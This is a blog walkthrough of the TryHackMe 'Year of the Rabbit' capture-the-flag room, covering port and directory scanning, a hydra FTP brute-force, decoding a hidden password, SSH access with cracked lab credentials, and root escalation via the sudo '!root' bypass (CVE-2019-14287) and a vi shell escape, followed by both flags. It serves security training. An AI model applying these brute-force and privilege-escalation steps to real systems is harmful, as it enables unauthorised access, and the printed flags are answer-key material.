---
title: "Year of the Rabbit CTF - TryHackMe"
author: Ludovic COULON
date: 2020-06-15
hero: ./images/hero.jpeg
excerpt: "Writeup for the Year of the Rabbit CTF room on TryHackMe"
---

[TryHackMe | Year of the Rabbit CTF](https://tryhackme.com/room/yearoftherabbit)

<div className="Image__Small">
  <img src="https://imgur.com/LmK6uGc.png" alt="blog_image" />
</div>

Can you hack into the Year of the Rabbit box without falling down a hole?

**(Please ensure your volume is turned up!)**

---

### Setup ✅

```bash
➜  TryHackMe nmap -A -vv 10.10.233.188
```

```bash
21/tcp open  ftp     syn-ack vsftpd 3.0.2

22/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=
|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh

80/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

<div className="Image__Medium">
  <img src="https://imgur.com/cU5jZhK.png" alt="blog_image" />
</div>

Let's see if there is some hidden directory

```bash
➜  TryHackMe dirb http://10.10.233.188/
```

<div className="Image__Medium">
  <img src="https://imgur.com/FC69Qf4.png" alt="blog_image" />
</div>

```bash
Take a look at the page: /sup3r_s3cr3t_fl4g.php
```

<div className="Image__Medium">
  <img src="https://imgur.com/gwtfthw.png" alt="blog_image" />
</div>

Well let's turn off javascript

[Firefox: Enable/Disable Javascript - Technipages](https://www.technipages.com/firefox-enable-disable-javascript)

<div className="Image__Medium">
  <img src="https://imgur.com/vrBiQ1R.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/GY5WvWS.jpg" alt="blog_image" />
</div>

As the message says you need to listen to the music

Approximately at 1min in the video you can hear

> I'll put you out of your misery you're looking in the wrong place

Just to be sure let's intercept the page with burp suite

<div className="Image__Medium">
  <img src="https://imgur.com/SLXGaRd.png" alt="blog_image" />
</div>

I tried to intercept some hidden directory without the JS enable, with JS enabled this came out

```bash
http://10.10.233.188/intermediary.php?hidden_directory=/WExYY2Cv-qU
```

<div className="Image__Medium">
  <img src="https://imgur.com/1ApgXFh.png" alt="blog_image" />
</div>

Let's see if there is something hidden on the image 🤓

<div className="Image__Medium">
  <img src="https://imgur.com/GKIUOxb.png" alt="blog_image" />
</div>

Let's create a word-list and use hydra to launch the bruteforce attack !

```bash
➜  TryHackMe hydra -l ftpuser -P ftppass.txt ftp://10.10.233.188
```

<div className="Image__Medium">
  <img src="https://imgur.com/SpqCPLF.png" alt="blog_image" />
</div>

```bash
login: ftpuser
password: 5iez1wGXKfPKQ
```

<div className="Image__Medium">
  <img src="https://imgur.com/cWtAqxJ.png" alt="blog_image" />
</div>

As you can see there is this password encoded with brainfuck let's crack it ! 🤑

[Brainfuck/Text/Ook! obfuscator - deobfuscator. Decode and encode online.](https://www.splitbrain.org/_static/ook/)

<div className="Image__Medium">
  <img src="https://imgur.com/pMgtoU4.png" alt="blog_image" />
</div>

```bash
User: eli
Password: DSpDiM1wAEwid
```

### #1 What is the user flag?

Let's use the creds that we crack earlier and connect to the ssh server

<div className="Image__Medium">
  <img src="https://imgur.com/SFc05u1.png" alt="blog_image" />
</div>

Nothing there let's try something else 😢

<div className="Image__Medium">
  <img src="https://imgur.com/IyB33Vb.png" alt="blog_image" />
</div>

```bash
password: MniVCQVhQHUNI
```

```bash
ssh gwendoline@10.10.233.188
```

<div className="Image__Medium">
  <img src="https://imgur.com/g9yP7Vb.png" alt="blog_image" />
</div>

```bash
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

### #2 What is the root flag?

```bash
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

[CVE-2019-14287 sudo Vulnerability Allows Bypass of User Restrictions](https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability)

[vi | GTFOBins](https://gtfobins.github.io/gtfobins/vi/#shell)

<div className="Image__Medium">
  <img src="https://imgur.com/9K0VeSI.png" alt="blog_image" />
</div>

```bash
#Type the following commands in vi
vi
:set shell=/bin/sh
:shell
```

```bash
#Root flag
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```


